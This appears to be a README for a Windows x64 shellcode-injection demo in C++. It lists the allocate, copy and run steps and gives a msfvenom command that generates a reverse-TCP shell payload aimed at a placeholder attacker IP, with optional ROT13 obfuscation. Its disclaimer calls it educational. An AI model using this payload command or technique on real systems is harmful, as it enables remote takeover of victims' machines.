# Shellcode Injection - Windows x64

````md
This project demonstrates manual shellcode injection using C++ and Windows API.

## 💻 Features
- Manual shellcode allocation and execution
- Uses VirtualAlloc, RtlCopyMemory, CreateThread
- Tested on Windows 10 x64

## ⚙️ Shellcode
Shellcode generated using `msfvenom`:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP LPORT=PORT -f c
````

> 🔐 Obfuscated with simple ROT13 (optional)

## 🧠 How it Works

1. Allocate memory with `VirtualAlloc`
2. Copy shellcode to allocated region
3. Run with `CreateThread`

## 🖼️ Screenshots

![Injection Demo](screenshot/analysis.png)

## 📁 File Structure

* `main.cpp` — injection code
* `shellcode.h` — contains unsigned char shellcode array
* `msfvenom_command.txt` — command used for payload

## ⚠️ Disclaimer

This is for **educational** purposes only. Do not use for malicious activity.

